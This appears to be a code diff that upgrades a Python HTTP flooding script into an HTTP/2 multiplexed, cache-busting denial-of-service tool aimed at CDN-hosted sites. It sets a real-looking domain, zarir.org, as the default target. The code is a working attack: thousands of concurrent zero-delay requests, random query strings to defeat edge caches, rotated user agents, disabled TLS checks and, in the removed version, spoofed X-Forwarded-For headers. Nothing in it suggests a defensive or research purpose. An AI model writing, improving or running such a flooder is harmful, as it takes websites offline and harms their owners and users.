@@ -1,133 +1,158 @@
 #!/usr/bin/env python3
 """
-flood_async.py - zero-latency asyncio HTTP/HTTPS flooder
-Usage: python3 flood_async.py [url] [-c CONCURRENCY] [-d SECONDS]
+flood_h2.py - HTTP/2 multiplexed, zero-delay, cache-bypass flooder
+Suitable for CDN/edge-hosted targets (Vercel, Netlify, Cloudflare Pages...)
+
+Why HTTP/2: hundreds of concurrent requests ride as *streams* over just a
+handful of TLS connections. No per-request handshake => the "SSL connection
+is closed" churn disappears and sustained req/s goes way up.
+
+Usage:
+  python3 flood_h2.py https://zarir.org -c 2000
+  python3 flood_h2.py https://zarir.org -c 3000 -d 120 -r
+  python3 flood_h2.py "https://zarir.org,https://zarir.org/about" -c 2000 -r
+
+Deps: pip install "httpx[http2]"
 """
 
-import argparse
 import asyncio
 import random
-import socket
-import ssl
+import sys
 import time
-import urllib.parse
+import warnings
+from collections import Counter
+
+import httpx
+
+warnings.filterwarnings("ignore")
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "curl/8.6.0",
-    "Go-http-client/2.0",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
 ]
 
-sent = 0
-errors = 0
-lock = asyncio.Lock()
+
+def parse_args(argv):
+    url = "https://zarir.org"
+    concurrency = 2000
+    duration = 0
+    cache_bust = False
+    paths = None
+    i = 0
+    while i < len(argv):
+        a = argv[i]
+        if a in ("-c", "--concurrency") and i + 1 < len(argv):
+            concurrency = int(argv[i + 1]); i += 2
+        elif a in ("-d", "--duration") and i + 1 < len(argv):
+            duration = int(argv[i + 1]); i += 2
+        elif a == "-r":
+            cache_bust = True; i += 1
+        elif a in ("-p", "--paths") and i + 1 < len(argv):
+            paths = [p.strip() for p in argv[i + 1].split(",") if p.strip()]; i += 2
+        elif a in ("-h", "--help"):
+            print(__doc__); sys.exit(0)
+        else:
+            url = a; i += 1
+    return url, concurrency, duration, cache_bust, paths
 
 
-def build_requests(host, path, method):
-    """Precompile request bytes ONCE - zero per-request CPU cost."""
-    reqs = []
-    for ua in USER_AGENTS:
-        req = (f"{method} {path} HTTP/1.1\r\n"
-               f"Host: {host}\r\n"
-               f"User-Agent: {ua}\r\n"
-               f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-               f"Accept-Language: en-US,en;q=0.9\r\n"
-               f"Accept-Encoding: gzip, deflate\r\n"
-               f"Connection: keep-alive\r\n"
-               f"Cache-Control: no-cache\r\n"
-               f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
-               f"\r\n").encode()
-        reqs.append(req)
-    return reqs
-
-
-async def hammer(host, port, ssl_ctx, reqs, sem):
-    global sent, errors
+async def hammer(client, urls, paths, cache_bust, stats):
+    """Zero-delay loop: one request finishes -> next starts immediately."""
     while True:
+        base = random.choice(urls)
+        url = base
+        if paths:
+            sep = "&" if "?" in base else "?"
+            url = f"{base}{sep}{random.choice(paths).lstrip('?')}"
+        if cache_bust:
+            sep = "&" if "?" in url else "?"
+            url = f"{url}{sep}_={random.randint(0, 2**31)}"   # defeat edge cache
+        t0 = time.monotonic()
         try:
-            reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx)
-            # TCP_NODELAY: disable Nagle - no packet delay
-            sock = writer.get_extra_info("socket")
-            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-            while True:
-                writer.write(random.choice(reqs))   # zero delay, tight loop
-                sent += 1
-                if writer.transport.get_write_buffer_size() > 65536:
-                    await writer.drain()
-                try:
-                    await asyncio.wait_for(reader.read(1024), timeout=0.02)
-                except asyncio.TimeoutError:
-                    pass
-                except Exception:
-                    break
-            writer.close()
-            try:
-                await writer.wait_closed()
-            except Exception:
-                pass
-        except Exception:
-            errors += 1
-            await asyncio.sleep(0.02)   # backoff only on hard connection failure
+            r = await client.get(
+                url,
+                headers={
+                    "User-Agent": random.choice(USER_AGENTS),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                    "Pragma": "no-cache",
+                },
+            )
+            stats["sent"] += 1
+            stats["codes"][r.status_code] = stats["codes"].get(r.status_code, 0) + 1
+            stats["lat"] += (time.monotonic() - t0) * 1000.0
+        except (httpx.HTTPError, OSError):
+            stats["errors"] += 1
+        # no sleep here -> zero latency between requests
 
 
-async def stats(start, duration):
+async def reporter(stats, start):
+    last, last_sent, peak = time.monotonic(), 0, 0.0
     while True:
-        await asyncio.sleep(5)
-        elapsed = time.time() - start
-        print(f"[{time.strftime('%H:%M:%S')}] sent={sent} errors={errors} "
-              f"rate={sent/elapsed:.0f} req/s", flush=True)
+        await asyncio.sleep(1)
+        now = time.monotonic()
+        rate = (stats["sent"] - last_sent) / (now - last)
+        peak = max(peak, rate)
+        last, last_sent = now, stats["sent"]
+        avg = stats["lat"] / stats["sent"] if stats["sent"] else 0.0
+        top = " ".join(f"{k}:{v}" for k, v in Counter(stats["codes"]).most_common(4)) or "-"
+        print(f"[{time.strftime('%H:%M:%S')}] {rate:7.0f} req/s | total={stats['sent']:9d} "
+              f"| err={stats['errors']:5d} | avg={avg:6.1f}ms | {top}", flush=True)
+        if stats["sent"] % 10000 == 0 and stats["sent"] > 0:
+            print(f"   peak so far: {peak:.0f} req/s", flush=True)
 
 
 async def main():
-    ap = argparse.ArgumentParser(description="Zero-latency asyncio flooder")
-    ap.add_argument("url", nargs="?", default="https://zarir.org")
-    ap.add_argument("-c", "--concurrency", type=int, default=3000)
-    ap.add_argument("-d", "--duration", type=int, default=0, help="seconds, 0 = until Ctrl+C")
-    ap.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "HEAD"])
-    args = ap.parse_args()
+    url, concurrency, duration, cache_bust, paths = parse_args(sys.argv[1:])
+    urls = [u.strip() for u in url.split(",") if u.strip()]
+    print(f"[*] Target       : {urls}")
+    print(f"[*] Concurrency  : {concurrency} in-flight (HTTP/2 multiplexed)")
+    print(f"[*] Cache-bust   : {'ON (random query per request)' if cache_bust else 'OFF'}")
+    print(f"[*] Duration     : {'unlimited (Ctrl+C)' if duration <= 0 else str(duration) + 's'}")
+    print(f"[*] Protocol     : HTTP/2, zero delay\n")
 
-    target = args.url if "://" in args.url else "https://" + args.url
-    p = urllib.parse.urlparse(target)
-    host = p.hostname or "zarir.org"
-    port = p.port or (443 if p.scheme == "https" else 80)
-    path = p.path or "/"
-    if p.query:
-        path += "?" + p.query
+    # Few long-lived HTTP/2 connections; all concurrency rides as streams.
+    limits = httpx.Limits(max_connections=16, max_keepalive_connections=16)
+    stats = {"sent": 0, "errors": 0, "codes": {}, "lat": 0.0}
+    start = time.monotonic()
 
-    ssl_ctx = None
-    if p.scheme == "https":
-        ssl_ctx = ssl.create_default_context()
-        ssl_ctx.check_hostname = False
-        ssl_ctx.verify_mode = ssl.CERT_NONE   # skip TLS verification = lower latency
-        ssl_ctx.set_ciphers("AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256")
+    async with httpx.AsyncClient(
+        http2=True,
+        verify=False,
+        follow_redirects=True,
+        limits=limits,
+        timeout=httpx.Timeout(5.0, connect=5.0),
+    ) as client:
+        rep = asyncio.create_task(reporter(stats, start))
+        tasks = [asyncio.create_task(hammer(client, urls, paths, cache_bust, stats))
+                 for _ in range(concurrency)]
+        try:
+            if duration > 0:
+                await asyncio.sleep(duration)
+            else:
+                while True:
+                    await asyncio.sleep(3600)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            for t in tasks:
+                t.cancel()
+            rep.cancel()
+            await asyncio.sleep(0.2)
 
-    reqs = build_requests(host, path, args.method)
-    print(f"[*] Target: {host}:{port} ({'HTTPS' if ssl_ctx else 'HTTP'})")
-    print(f"[*] Concurrency: {args.concurrency} | Method: {args.method} | Path: {path}")
-
-    start = time.time()
-    asyncio.create_task(stats(start, args.duration))
-    tasks = [asyncio.create_task(hammer(host, port, ssl_ctx, reqs, None))
-             for _ in range(args.concurrency)]
-
-    try:
-        if args.duration > 0:
-            await asyncio.sleep(args.duration)
-        else:
-            while True:
-                await asyncio.sleep(3600)
-    except (KeyboardInterrupt, asyncio.CancelledError):
-        pass
-    finally:
-        for t in tasks:
-            t.cancel()
-        print(f"\n[*] Done. Total: {sent} | Errors: {errors} | "
-              f"Avg rate: {sent/(time.time()-start):.0f} req/s")
+    elapsed = time.monotonic() - start
+    print("\n============== FINAL REPORT ==============")
+    print(f"Total requests : {stats['sent']}")
+    print(f"Avg rate       : {stats['sent']/elapsed:.0f} req/s")
+    print(f"Errors         : {stats['errors']}")
+    if stats["sent"]:
+        print(f"Avg latency    : {stats['lat']/stats['sent']:.1f} ms")
+    print(f"Status codes   : {dict(Counter(stats['codes']))}")
+    print("==========================================")
 
 
 if __name__ == "__main__":
